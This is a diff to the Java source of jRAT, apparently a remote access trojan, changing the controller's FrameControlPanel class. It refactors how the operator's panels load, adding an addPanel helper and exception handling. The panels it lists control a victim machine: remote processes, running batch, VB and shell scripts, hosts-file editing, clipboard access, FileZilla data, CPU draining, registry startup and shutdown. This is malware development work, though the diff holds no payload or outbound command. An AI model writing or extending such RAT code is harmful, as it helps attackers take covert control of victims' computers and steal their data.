@@ -36,6 +36,7 @@ import pro.jrat.api.RATControlMenuEntry;
 import com.redpois0n.Constants;
 import com.redpois0n.Script;
 import com.redpois0n.Slave;
+import com.redpois0n.exceptions.ControlPanelLoadException;
 import com.redpois0n.listeners.Performable;
 import com.redpois0n.packets.outgoing.Packet11Disconnect;
 import com.redpois0n.packets.outgoing.Packet28ShutdownComputer;
@@ -68,6 +69,7 @@ import com.redpois0n.ui.panels.PanelControlLocales;
 import com.redpois0n.ui.panels.PanelControlMessagebox;
 import com.redpois0n.ui.panels.PanelControlMonitors;
 import com.redpois0n.ui.panels.PanelControlNetGateway;
+import com.redpois0n.ui.panels.PanelControlParent;
 import com.redpois0n.ui.panels.PanelControlPiano;
 import com.redpois0n.ui.panels.PanelControlPrinter;
 import com.redpois0n.ui.panels.PanelControlRegStart;
@@ -255,7 +257,7 @@ public class FrameControlPanel extends BaseFrame {
 
 	public ControlPanelRenderer getRenderer() {
 		final ControlPanelRenderer r = new ControlPanelRenderer();
-		new Thread() {
+		new Thread(new Runnable() {
 			public void run() {
 				r.icons.put("control panel", IconUtils.getIcon("controlpanel"));
 				r.icons.put("system info", IconUtils.getIcon("info"));
@@ -341,7 +343,7 @@ public class FrameControlPanel extends BaseFrame {
 				}
 				getTree().repaint();
 			}
-		}.start();
+		}).start();
 
 		return r;
 	}
@@ -411,7 +413,6 @@ public class FrameControlPanel extends BaseFrame {
 					BaseControlPanel panel = entry.newPanelInstance(RATObjectFormat.format(slave));
 					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? def : entry.getIcon(), panel);
 					entry.instances.put(slave.getIP(), panel);
-
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
@@ -527,41 +528,50 @@ public class FrameControlPanel extends BaseFrame {
 
 	public void addPanels() {
 		panels.clear();
-		panels.put("computer info", new PanelControlComputerInfo(slave));
-		panels.put("system monitor", new PanelControlSystemMonitor(slave));
-		panels.put("fun manager", new PanelControlFunManager(slave));
-		panels.put("messagebox", new PanelControlMessagebox(slave));
-		panels.put("remote process", new PanelControlRemoteProcess(slave));
-		panels.put("html", new PanelControlScript(slave, Script.HTML));
-		panels.put("vb script", new PanelControlScript(slave, Script.VB));
-		panels.put("batch", new PanelControlScript(slave, Script.BAT));
-		panels.put("javascript", new PanelControlScript(slave, Script.JS));
-		panels.put("shell script", new PanelControlScript(slave, Script.SH));
-		panels.put("file searcher", new PanelControlSearch(slave));
-		panels.put("hosts file", new PanelControlHostsFile(slave));
-		panels.put("utorrent downloads", new PanelControluTorrentDownloads(slave));
-		panels.put("download manager", new PanelControlDownloadManager(slave));
-		panels.put("clipboard", new PanelControlClipboard(slave));
-		panels.put("jvm info", new PanelControlJVM(slave));
-		panels.put("piano", new PanelControlPiano(slave));
-		panels.put("filezilla", new PanelControlFileZilla(slave));
-		panels.put("printer", new PanelControlPrinter(slave));
-		panels.put("lan computers", new PanelControlLANComputers(slave));
-		panels.put("net gateway", new PanelControlNetGateway(slave));
-		panels.put("active ports", new PanelControlActivePorts(slave));
-		panels.put("drain cpu", new PanelControlCPU(slave));
-		panels.put("speech", new PanelControlSpeech(slave));
-		panels.put("windows services", new PanelControlServices(slave));
-		panels.put("registry startup", new PanelControlRegStart(slave));
-		panels.put("installed programs", new PanelControlInstalledPrograms(slave));
-		panels.put("network adapters", new PanelControlAdapters(slave));
-		panels.put("drives", new PanelControlDrives(slave));
-		panels.put("monitors", new PanelControlMonitors(slave));
-		panels.put("error log", new PanelControlErrorLog(slave));
-		panels.put("config", new PanelControlConfig(slave));
-		panels.put("view installed plugins", new PanelControlLoadedPlugins(slave));
-		panels.put("locales", new PanelControlLocales(slave));
-		panels.put("trace", new PanelControlTrace(slave));
+		try {
+			addPanel("computer info", new PanelControlComputerInfo(slave));
+			addPanel("system monitor", new PanelControlSystemMonitor(slave));
+			addPanel("fun manager", new PanelControlFunManager(slave));
+			addPanel("messagebox", new PanelControlMessagebox(slave));
+			addPanel("remote process", new PanelControlRemoteProcess(slave));
+			addPanel("html", new PanelControlScript(slave, Script.HTML));
+			addPanel("vb script", new PanelControlScript(slave, Script.VB));
+			addPanel("batch", new PanelControlScript(slave, Script.BAT));
+			addPanel("javascript", new PanelControlScript(slave, Script.JS));
+			addPanel("shell script", new PanelControlScript(slave, Script.SH));
+			addPanel("file searcher", new PanelControlSearch(slave));
+			addPanel("hosts file", new PanelControlHostsFile(slave));
+			addPanel("utorrent downloads", new PanelControluTorrentDownloads(slave));
+			addPanel("download manager", new PanelControlDownloadManager(slave));
+			addPanel("clipboard", new PanelControlClipboard(slave));
+			addPanel("jvm info", new PanelControlJVM(slave));
+			addPanel("piano", new PanelControlPiano(slave));
+			addPanel("filezilla", new PanelControlFileZilla(slave));
+			addPanel("printer", new PanelControlPrinter(slave));
+			addPanel("lan computers", new PanelControlLANComputers(slave));
+			addPanel("net gateway", new PanelControlNetGateway(slave));
+			addPanel("active ports", new PanelControlActivePorts(slave));
+			addPanel("drain cpu", new PanelControlCPU(slave));
+			addPanel("speech", new PanelControlSpeech(slave));
+			addPanel("windows services", new PanelControlServices(slave));
+			addPanel("registry startup", new PanelControlRegStart(slave));
+			addPanel("installed programs", new PanelControlInstalledPrograms(slave));
+			addPanel("network adapters", new PanelControlAdapters(slave));
+			addPanel("drives", new PanelControlDrives(slave));
+			addPanel("monitors", new PanelControlMonitors(slave));
+			addPanel("error log", new PanelControlErrorLog(slave));
+			addPanel("config", new PanelControlConfig(slave));
+			addPanel("view installed plugins", new PanelControlLoadedPlugins(slave));
+			addPanel("locales", new PanelControlLocales(slave));
+			addPanel("trace", new PanelControlTrace(slave));
+		} catch (Exception ex) {
+			ControlPanelLoadException cple = new ControlPanelLoadException("Failed to load a panel", ex);
+			cple.printStackTrace();
+		}
+	}
+	
+	public void addPanel(String name, PanelControlParent panel) {
+		panels.put(name, panel);
 	}
 
 	public void addActions() {
